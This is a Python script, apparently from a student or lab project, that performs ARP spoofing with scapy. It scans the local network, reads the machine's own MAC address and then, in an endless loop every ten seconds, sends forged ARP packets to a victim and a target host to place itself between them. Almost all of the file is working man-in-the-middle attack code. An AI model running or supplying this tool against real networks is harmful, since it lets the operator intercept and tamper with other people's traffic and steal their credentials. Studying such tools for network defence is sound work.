# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen
import threading
from time import sleep

import scapy.config
import scapy.route
from scapy.all import *
from scapy.layers.l2 import ARP, Ether


class ArpSpoof(threading.Thread):

    local_host = '127.0.0.1'
    non_routable = '0.0.0.0'
    def_mask = 0xFFFFFFFF

    ip_mac_pairs = {}

    def __init__(self, vIP, tIP):
        self.vIP = vIP
        self.tIP = tIP
        try:
            attacker_mac = self.get_own_mac_address()
        except Exception as e:
            print(e)
            sys.exit(1)
        self.ip_address = socket.gethostbyname(socket.gethostname())
        self.host_mac = attacker_mac
        threading.Thread.__init__(self)

    """
    courtesy of the script shared by Benedikt Waldvogel at stackOverFlow: 
    https://stackoverflow.com/questions/207234/list-of-ip-addresses-hostnames-from-local-network-in-python/
    """
    def to_CIDR_notation(self, network_bytes, netmask_bytes):
        network = scapy.utils.ltoa(network_bytes)
        netmask = 32 - int(round(math.log(self.def_mask - netmask_bytes, 2)))
        return "%s/%s" % (network, netmask)

    def scan_local_network(self):
        for network, netmask, NA, iface, address in scapy.config.conf.route.routes:
            if network == 0 or iface == 'lo' or address == self.local_host or address == self.non_routable:
                continue  # skip default gateway and loop-back network
            if netmask == self.def_mask or netmask <= 0:
                continue
            net = self.to_CIDR_notation(network, netmask)
            if iface != scapy.config.conf.iface:
                continue  # scapy does not support arp-ing on non-primary network interfaces
            if net:
                try:
                    ans, unans = scapy.layers.l2.arping(net, iface=iface, timeout=1, verbose=False)
                    for s, r in ans.res:
                        try:
                            self.ip_mac_pairs[r.psrc] = r.hwsrc
                        except socket.herror:
                            pass  # did not resolve
                except socket.error as err:
                    if err.errno == errno.EPERM:  # no root? (classic Abdel move)
                        print('no permission - did you run it with root permissions?')
                    else:
                        raise  # other error type
            # for i in self.ip_mac_pairs:
            #     print(i, self.ip_mac_pairs[i], " check")

    """
    Return own mac_addresss
    @rtype: str
    @return: mac address
    """
    def get_own_mac_address(self):
        macs = [get_if_hwaddr(i) for i in get_if_list()]
        for mac in macs:
            if mac != "00:00:00:00:00:00":
                return mac
        raise Exception("Failed to obtain local mac address")

    def spoof_arp(self):
        print([self.host_mac, self.tIP, self.vIP])
        sendp([
            Ether() / ARP(op=ARP.who_has, hwsrc=self.host_mac, psrc=self.tIP, pdst=self.vIP),
            Ether() / ARP(op=ARP.who_has, hwsrc=self.host_mac,psrc=self.vIP, pdst=self.tIP)
        ])

    def run(self):
        # self.scan_local_network()
        while True:
            self.spoof_arp()
            sleep(10)